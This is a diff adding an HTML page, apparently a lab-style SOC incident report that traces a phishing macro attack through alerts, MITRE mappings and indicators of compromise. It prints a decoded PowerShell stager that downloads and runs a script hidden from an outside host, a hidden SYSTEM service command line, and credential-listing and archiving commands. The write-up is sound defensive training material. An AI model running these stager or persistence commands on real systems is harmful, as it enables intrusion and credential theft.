@@ -1,0 +1,432 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Incident Report: Operation Repossessed</title>
+    <style>
+        :root {
+            --bg-color: #0f1115;
+            --panel-bg: #1a1d24;
+            --text-main: #e2e8f0;
+            --text-muted: #94a3b8;
+            --thm-green: #9fef00;
+            --thm-green-dark: #7bc200;
+            --border-color: #2d3748;
+            --danger: #ef4444;
+            --warning: #f59e0b;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            line-height: 1.6;
+            margin: 0;
+            padding: 0;
+        }
+
+        .container {
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+
+        /* Header */
+        header {
+            text-align: center;
+            margin-bottom: 50px;
+            padding-bottom: 30px;
+            border-bottom: 2px solid var(--thm-green);
+        }
+
+        h1 {
+            color: var(--thm-green);
+            font-size: 2.5em;
+            margin-bottom: 10px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            text-shadow: 0 0 10px rgba(159, 239, 0, 0.2);
+        }
+
+        .subtitle {
+            color: var(--text-muted);
+            font-size: 1.2em;
+        }
+
+        /* Executive Summary */
+        .summary-box {
+            background-color: var(--panel-bg);
+            border-left: 5px solid var(--thm-green);
+            padding: 20px 30px;
+            border-radius: 4px;
+            margin-bottom: 40px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
+        }
+
+        .summary-box h2 {
+            color: var(--thm-green);
+            margin-top: 0;
+        }
+
+        /* Alerts & Steps */
+        .alert-card {
+            background-color: var(--panel-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            margin-bottom: 30px;
+            overflow: hidden;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.2);
+            transition: transform 0.2s ease;
+        }
+
+        .alert-card:hover {
+            transform: translateY(-2px);
+            border-color: var(--thm-green);
+        }
+
+        .alert-header {
+            background-color: rgba(159, 239, 0, 0.1);
+            padding: 15px 20px;
+            border-bottom: 1px solid var(--border-color);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .alert-header h3 {
+            margin: 0;
+            color: var(--thm-green);
+            font-size: 1.3em;
+        }
+
+        .severity {
+            padding: 4px 10px;
+            border-radius: 4px;
+            font-size: 0.85em;
+            font-weight: bold;
+            text-transform: uppercase;
+        }
+
+        .sev-critical { background-color: var(--danger); color: white; }
+        .sev-high { background-color: var(--warning); color: black; }
+        .sev-medium { background-color: #3b82f6; color: white; }
+
+        .alert-body {
+            padding: 20px;
+        }
+
+        .alert-body h4 {
+            color: var(--text-main);
+            margin-top: 20px;
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 5px;
+        }
+
+        .alert-body h4:first-child { margin-top: 0; }
+
+        /* Tables */
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 15px 0;
+            font-size: 0.9em;
+        }
+
+        th, td {
+            padding: 10px;
+            text-align: left;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        th {
+            color: var(--thm-green);
+            font-weight: 600;
+            background-color: rgba(255,255,255,0.02);
+        }
+
+        td { color: var(--text-muted); }
+        td strong { color: var(--text-main); }
+
+        /* Code Blocks */
+        pre {
+            background-color: #0b0c10;
+            padding: 15px;
+            border-radius: 4px;
+            overflow-x: auto;
+            border-left: 3px solid var(--thm-green-dark);
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 0.9em;
+            color: #a78bfa;
+        }
+
+        /* Images */
+        .img-container {
+            margin: 20px 0;
+            text-align: center;
+        }
+
+        .img-container img {
+            max-width: 100%;
+            border-radius: 4px;
+            border: 1px solid var(--border-color);
+            box-shadow: 0 4px 8px rgba(0,0,0,0.5);
+        }
+
+        .caption {
+            font-size: 0.85em;
+            color: var(--text-muted);
+            margin-top: 8px;
+            font-style: italic;
+        }
+
+        /* Tags */
+        .tag {
+            display: inline-block;
+            background-color: rgba(159, 239, 0, 0.15);
+            color: var(--thm-green);
+            padding: 3px 8px;
+            border-radius: 4px;
+            font-size: 0.8em;
+            margin-right: 5px;
+            margin-bottom: 5px;
+            border: 1px solid rgba(159, 239, 0, 0.3);
+        }
+
+        .verdict-box {
+            background-color: rgba(239, 68, 68, 0.1);
+            border: 1px solid var(--danger);
+            padding: 10px 15px;
+            border-radius: 4px;
+            margin: 15px 0;
+        }
+        
+        .verdict-box.true-positive {
+            background-color: rgba(159, 239, 0, 0.1);
+            border-color: var(--thm-green);
+        }
+
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <header>
+        <h1>Operation Repossessed</h1>
+        <div class="subtitle">Incident Response Report | TryHatMe Studios</div>
+        <div class="subtitle">Analyst: asahel.msc | MTTR: 0.03 min | Score: 900 pts</div>
+    </header>
+
+    <div class="img-container">
+        <!-- Screenshot: Victory! -->
+        <img src="https://i.imgur.com/placeholder_victory.jpg" alt="Victory Screen">
+        <div class="caption">Successful conclusion of the SOC Simulator with 100% true positive rate.</div>
+    </div>
+
+    <div class="summary-box">
+        <h2>Executive Summary</h2>
+        <p>On October 23, 2026, a phishing email containing a malicious document (<code>Q3_PressKit_Feedback.docm</code>) was opened by a Marketing user on workstation <strong>THM-MSMITH</strong>. This led to the execution of a hidden, encoded PowerShell payload that established command-and-control (C2) communication, harvested local credentials, and enumerated domain accounts. The threat actor subsequently utilized the compromised service account <code>svc-mktshare</code> to move laterally to a second host, <strong>THM-SREYES</strong>, where they installed a malicious Windows service. Ultimately, the actor archived sensitive intellectual property (<code>C:\Dev\NeuralNexus\Build\*</code>) and exfiltrated it to external infrastructure.</p>
+    </div>
+
+    <!-- ALERT 1 -->
+    <div class="alert-card">
+        <div class="alert-header">
+            <h3>Alert 1: Suspicious Child Process Spawned</h3>
+            <span class="severity sev-high">High</span>
+        </div>
+        <div class="alert-body">
+            <h4>1. Investigation Steps & Log Analysis</h4>
+            <p>The initial alert fired when <code>WINWORD.EXE</code> spawned a child process. Initial investigation of the <code>ai.exe</code> process proved it to be a legitimate Microsoft AI host component. However, pivoting on the parent Process GUID revealed the true threat:</p>
+            <pre>powershell.exe -NoP -W Hidden -Enc JABzAHQAYQBnAGUAcgAgAD0AIAAiACQAZQBuAHYA...</pre>
+            
+            <div class="img-container">
+                <!-- Screenshot: Splunk logs showing powershell and ai.exe -->
+                <img src="https://i.imgur.com/placeholder_splunk_logs.jpg" alt="Splunk Logs">
+                <div class="caption">Sysmon EventCode 1 showing the hidden PowerShell execution alongside the benign ai.exe process.</div>
+            </div>
+
+            <h4>2. Analysis & Decoding</h4>
+            <p>The command line used <code>-NoP</code> (No Profile), <code>-W Hidden</code> (Hidden Window), and <code>-Enc</code> (Base64 encoded). Decoding the Base64 string revealed a download-and-execute stager:</p>
+            <pre>$stager = "$env:TEMP\svchost_update.ps1"
+(New-Object Net.WebClient).DownloadFile('http://payload-cdn.thm:8067/svchost_update.ps1', $stager)
+Start-Process powershell.exe -ArgumentList "-NoP -W Hidden -ExecutionPolicy Bypass -File `"$stager`"" -WindowStyle Hidden</pre>
+
+            <h4>3. Verdict</h4>
+            <div class="verdict-box true-positive">
+                <strong>True Positive.</strong> Malicious execution via a weaponized macro document.
+            </div>
+
+            <h4>4. MITRE ATT&CK Mapping</h4>
+            <span class="tag">T1566.001 - Spearphishing Attachment</span>
+            <span class="tag">T1059.001 - PowerShell</span>
+            <span class="tag">T1027 - Obfuscated Files or Information</span>
+        </div>
+    </div>
+
+    <!-- ALERT 2 -->
+    <div class="alert-card">
+        <div class="alert-header">
+            <h3>Alert 2: Suspicious External Connection</h3>
+            <span class="severity sev-critical">Critical</span>
+        </div>
+        <div class="alert-body">
+            <h4>1. Investigation Steps & Log Analysis</h4>
+            <p>Sysmon EventCode 3 (Network Connection) showed the spawned PowerShell process (PID 8572) connecting to external infrastructure.</p>
+            <table>
+                <tr><th>Field</th><th>Value</th></tr>
+                <tr><td>Destination IP</td><td><code>45.147.230.131</code></td></tr>
+                <tr><td>Destination Port</td><td><code>8067</code></td></tr>
+                <tr><td>Initiated</td><td><code>true</code></td></tr>
+            </table>
+            <p>Subsequent DNS logs showed a query for <code>paylink-cdn.thm</code> resolving to this IP. The port exactly matched the one in the decoded payload from Alert 1.</p>
+
+            <h4>2. Verdict</h4>
+            <div class="verdict-box true-positive">
+                <strong>True Positive.</strong> Confirmed Command and Control (C2) / Payload Download.
+            </div>
+
+            <h4>3. MITRE ATT&CK Mapping</h4>
+            <span class="tag">T1071.001 - Web Protocols</span>
+            <span class="tag">T1105 - Ingress Tool Transfer</span>
+        </div>
+    </div>
+
+    <!-- ALERT 3 -->
+    <div class="alert-card">
+        <div class="alert-header">
+            <h3>Alert 3: Anomalous Credential Vault Access</h3>
+            <span class="severity sev-high">High</span>
+        </div>
+        <div class="alert-body">
+            <h4>1. Investigation Steps & Log Analysis</h4>
+            <p>A process execution alert showed <code>vaultcmd.exe</code> enumerating the Windows Credential Manager.</p>
+            <pre>"C:\Windows\Sysnative\vaultcmd.exe" "/listcreds:Windows Credentials"</pre>
+            <p>The Parent Process was identified as PID 9356, which was the second-stage PowerShell script (<code>svchost_update.ps1</code>) downloaded in Alert 1.</p>
+            <p><em>Note: The event was initially difficult to locate due to time-stamping offsets between the alert generation and the Sysmon log ingestion.</em></p>
+
+            <h4>2. Verdict</h4>
+            <div class="verdict-box true-positive">
+                <strong>True Positive.</strong> Credential Access. The attacker is harvesting saved credentials to facilitate lateral movement.
+            </div>
+
+            <h4>3. MITRE ATT&CK Mapping</h4>
+            <span class="tag">T1555 - Credentials from Password Stores</span>
+        </div>
+    </div>
+
+    <!-- ALERT 4 -->
+    <div class="alert-card">
+        <div class="alert-header">
+            <h3>Alert 4: Rapid Domain and Host Enumeration</h3>
+            <span class="severity sev-high">High</span>
+        </div>
+        <div class="alert-body">
+            <h4>1. Investigation Steps & Log Analysis</h4>
+            <p>Execution of discovery commands by the second-stage payload (Parent PID 9356).</p>
+            <pre>"C:\Windows\system32\net.exe" user /domain</pre>
+            <p>This command enumerates all user accounts in the Active Directory domain, allowing the attacker to map targets for lateral movement.</p>
+
+            <h4>2. Verdict</h4>
+            <div class="verdict-box true-positive">
+                <strong>True Positive.</strong> Domain Discovery.
+            </div>
+
+            <h4>3. MITRE ATT&CK Mapping</h4>
+            <span class="tag">T1087.002 - Domain Account Discovery</span>
+        </div>
+    </div>
+
+    <!-- ALERT 5 -->
+    <div class="alert-card">
+        <div class="alert-header">
+            <h3>Alert 5: Suspicious Remote Logon and Service Creation</h3>
+            <span class="severity sev-critical">Critical</span>
+        </div>
+        <div class="alert-body">
+            <h4>1. Investigation Steps & Log Analysis</h4>
+            <p>The attacker moved laterally to a new host, <code>THM-SREYES.tryhatmestudios.thm</code>. Windows Security Event 4697 was triggered:</p>
+            <table>
+                <tr><th>Field</th><th>Value</th></tr>
+                <tr><td>Account Name</td><td><code>svc-mktshare</code> (Compromised service account)</td></tr>
+                <tr><td>Service Name</td><td><code>SvcUpdate</code></td></tr>
+                <tr><td>Service File Name</td><td><code>cmd.exe /c start /b powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy Bypass -File C:\Windows\Temp\svchost_update.ps1</code></td></tr>
+                <tr><td>Service Account</td><td><code>LocalSystem</code></td></tr>
+            </table>
+
+            <div class="img-container">
+                <!-- Screenshot: Event 4697 -->
+                <img src="https://i.imgur.com/placeholder_4697.jpg" alt="Event 4697 Service Creation">
+                <div class="caption">Security Event 4697 showing the installation of the malicious SvcUpdate service.</div>
+            </div>
+
+            <p>The attacker used the harvested credentials (from Alert 3) to install a persistent service that runs the same payload but with highest SYSTEM privileges.</p>
+
+            <h4>2. Verdict</h4>
+            <div class="verdict-box true-positive">
+                <strong>True Positive.</strong> Lateral Movement and Persistence.
+            </div>
+
+            <h4>3. MITRE ATT&CK Mapping</h4>
+            <span class="tag">T1021.002 - SMB/Windows Admin Shares</span>
+            <span class="tag">T1543.003 - Create or Modify System Process: Windows Service</span>
+        </div>
+    </div>
+
+    <!-- ALERT 6 & 7 -->
+    <div class="alert-card">
+        <div class="alert-header">
+            <h3>Alert 6 & 7: Archive Creation and Exfiltration</h3>
+            <span class="severity sev-critical">Critical</span>
+        </div>
+        <div class="alert-body">
+            <h4>1. Investigation Steps & Log Analysis</h4>
+            <p>On the compromised host <code>THM-SREYES</code>, the attacker's SYSTEM-level PowerShell process (PID 14264) began staging data for theft.</p>
+            <pre>"C:\Program Files\7-Zip\7z.exe" a -mx=1 C:\Windows\Temp\nx_build_beta.7z C:\Dev\NeuralNexus\Build\*</pre>
+            <p>Seconds later, the same PowerShell process connected outbound to the attacker's C2 infrastructure:</p>
+            <table>
+                <tr><th>Field</th><th>Value</th></tr>
+                <tr><td>Destination IP</td><td><code>45.147.230.131</code></td></tr>
+                <tr><td>Destination Port</td><td><code>8067</code></td></tr>
+                <tr><td>Source Process</td><td><code>powershell.exe</code> (PID 14264)</td></tr>
+            </table>
+            
+            <div class="img-container">
+                <!-- Screenshot: Alert Queue showing completed alerts -->
+                <img src="https://i.imgur.com/placeholder_alert_queue.jpg" alt="Alert Queue">
+                <div class="caption">The completed Alert Queue showing the progression from Discovery to Exfiltration.</div>
+            </div>
+
+            <p>This sequence confirms the classic <strong>Collection</strong> and <strong>Exfiltration</strong> phases of the attack. The intellectual property (NeuralNexus game build) was compressed and uploaded directly to the known malicious IP.</p>
+
+            <h4>2. Verdict</h4>
+            <div class="verdict-box true-positive">
+                <strong>True Positive.</strong> Data Staging and Confirmed Exfiltration.
+            </div>
+
+            <h4>3. MITRE ATT&CK Mapping</h4>
+            <span class="tag">T1560.001 - Archive via Utility</span>
+            <span class="tag">T1041 - Exfiltration Over C2 Channel</span>
+        </div>
+    </div>
+
+    <!-- Summary of IOCs -->
+    <div class="summary-box" style="border-left-color: var(--danger);">
+        <h2 style="color: var(--danger);">Indicators of Compromise (IOCs)</h2>
+        <table>
+            <tr><th>Type</th><th>Indicator</th></tr>
+            <tr><td>IP Address</td><td><code>45.147.230.131</code> (C2 & Exfiltration)</td></tr>
+            <tr><td>IP Address</td><td><code>104.18.32.47</code> (Cloudflare / Secondary C2)</td></tr>
+            <tr><td>Domain</td><td><code>payload-cdn.thm</code>, <code>paylink-cdn.thm</code></td></tr>
+            <tr><td>File Path</td><td><code>C:\Users\m.smith\Downloads\Q3_PressKit_Feedback.docm</code></td></tr>
+            <tr><td>File Path</td><td><code>C:\Windows\Temp\svchost_update.ps1</code></td></tr>
+            <tr><td>File Path</td><td><code>C:\Windows\Temp\nx_build_beta.7z</code></td></tr>
+            <tr><td>Service Name</td><td><code>SvcUpdate</code></td></tr>
+            <tr><td>Account</td><td><code>TRYHATME\svc-mktshare</code> (Compromised)</td></tr>
+            <tr><td>SHA256 (Payload)</td><td><code>B7327B511CBADC9C471F5AA7438E47FFEC3430145C8D23E0E3256183295CA974</code></td></tr>
+        </table>
+    </div>
+
+</div>
+
+</body>
+</html>
